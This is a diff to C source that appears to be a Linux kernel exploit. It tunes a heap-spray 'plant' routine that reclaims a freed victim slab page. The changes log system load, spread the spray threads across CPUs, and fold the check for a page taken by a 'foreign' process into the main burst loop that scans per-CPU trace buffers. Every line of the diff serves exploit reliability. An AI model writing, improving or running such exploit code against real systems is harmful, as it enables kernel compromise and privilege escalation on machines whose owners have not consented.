@@ -2376,6 +2376,12 @@ static void run_plant(unsigned long long target, int tag, int mode,
     struct spray_arg args[SPRAY_THREADS];
     int ready_p[2], ack_p[2], tid_p[2], timer_go[2];
     memset(res, 0, sizeof(*res));
+    {
+        char lb[80] = {0};
+        FILE *lf = fopen("/proc/loadavg", "r");
+        if (lf) { if (!fgets(lb, sizeof(lb), lf)) lb[0] = 0; fclose(lf); }
+        logf("[+] plant%d loadavg=%.*s\n", tag, 40, lb);
+    }
     if (pipe(ready_p) || pipe(ack_p) || pipe(tid_p) || pipe(timer_go))
     {
         logf("[-] plant%d pipe failed\n", tag);
@@ -2595,7 +2601,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
             args[i].payload = payload;
             args[i].sock_first = i * per;
             args[i].sock_count = per;
-            args[i].cpu = 2; /* A/B v9b: 全部喷线程 pin CPU2 */
+            args[i].cpu = i;
             args[i].idx = i;
             atomic_store(&g_spray_tids[i], -1);
             if (pthread_create(&th[i], NULL, spray_thread, &args[i]))
@@ -2660,16 +2666,19 @@ static void run_plant(unsigned long long target, int tag, int mode,
     long t1 = now_ms();
     logf("[burst] pfn=%#llx start_up=%ldms\n", slab_pfn, t1);
     int hit = 0;
+    int foreign = 0;
 
     while (!hit && now_ms() - t1 < 15000)
     {
-        for (int cpu = 0; cpu < 8 && !hit; cpu++)
+        for (int cpu = 0; cpu < 8; cpu++)
         {
             long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
 
             if (m <= 0)
                 continue;
-            if (scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
+            if (scan_page_alloc_foreign(raw, (size_t)m, slab_pfn))
+                foreign = 1;
+            if (!hit && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
             {
                 hit = 1;
             }
@@ -2690,15 +2699,19 @@ static void run_plant(unsigned long long target, int tag, int mode,
     for (int i = 0; i < SPRAY_THREADS; i++)
         pthread_join(th[i], NULL);
     trace_stop();
-    for (int cpu = 0; cpu < 8 && !hit; cpu++)
+    for (int cpu = 0; cpu < 8; cpu++)
     {
         long m = read_fd(g_rawfd[cpu], raw, 32u << 20);
 
-        if (m > 0 && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
+        if (m <= 0)
+            continue;
+        if (!hit && scan_page_alloc_ours(raw, (size_t)m, slab_pfn))
             hit = 1;
+        if (scan_page_alloc_foreign(raw, (size_t)m, slab_pfn))
+            foreign = 1;
     }
-    logf("[+] plant%d free_seen=%d burst hit=%d after %ldms\n",
-         tag, free_seen, hit, now_ms() - t1);
+    logf("[+] plant%d free_seen=%d burst hit=%d foreign=%d after %ldms\n",
+         tag, free_seen, hit, foreign, now_ms() - t1);
     if (!hit)
     {
         /* A miss means a system allocation won the freed victim page, so the
@@ -2712,21 +2725,12 @@ static void run_plant(unsigned long long target, int tag, int mode,
         park_forever("burst miss");
     }
 
-    /* reap 前二次校验：victim 页若已被他方抢走，绝不 waitpid */
+    /* 校验已并入 burst 消费点：foreign=1 说明受害页被别的 pid 抢走，绝不 waitpid */
+    if (foreign)
     {
-        int foreign = 0;
-        for (int cpu = 0; cpu < 8 && !foreign; cpu++)
-        {
-            long m2 = read_fd(g_rawfd[cpu], raw, 32u << 20);
-            if (m2 > 0 && scan_page_alloc_foreign(raw, (size_t)m2, slab_pfn))
-                foreign = 1;
-        }
-        if (foreign)
-        {
-            logf("[-] plant%d victim stolen by foreign pid; parking\n", tag);
-            g_held++;
-            park_forever("victim stolen");
-        }
+        logf("[-] plant%d victim stolen by foreign pid; parking\n", tag);
+        g_held++;
+        park_forever("victim stolen");
     }
     usleep(1000);
     int st = 0;
